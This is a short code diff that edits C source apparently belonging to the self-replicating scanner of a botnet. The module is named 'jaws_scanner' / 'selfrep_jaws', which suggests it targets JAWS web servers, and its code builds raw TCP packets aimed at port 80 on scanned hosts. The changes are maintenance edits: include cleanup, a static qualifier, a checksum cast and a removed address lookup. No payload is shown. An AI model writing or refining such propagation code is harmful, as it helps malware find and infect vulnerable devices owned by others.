@@ -14,8 +14,6 @@
 #include <signal.h>
 #include <errno.h>
 #include <string.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
 
 #include "includes.h"
 #include "selfrep_jaws.h"
@@ -26,7 +24,7 @@
 
 int jaws_scanner_pid = 0, jaws_rsck = 0, jaws_rsck_out = 0;
 char jaws_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
-struct jaws_scanner_connection *conn_table;
+static struct jaws_scanner_connection *conn_table;
 uint32_t jaws_fake_time = 0;
 
 int jaws_recv_strip_null(int sock, void *buf, int len, int flags)
@@ -61,7 +59,6 @@ void jaws_scanner(void)
     if (jaws_scanner_pid > 0 || jaws_scanner_pid == -1)
         return;
 
-    LOCAL_ADDR = util_local_addr();
 
     rand_init();
     jaws_fake_time = time(NULL);
@@ -146,7 +143,7 @@ void jaws_scanner(void)
                 tcph->dest = htons(80);
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
-                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
+                tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
 
                 paddr.sin_family = AF_INET;
                 paddr.sin_addr.s_addr = iph->daddr;
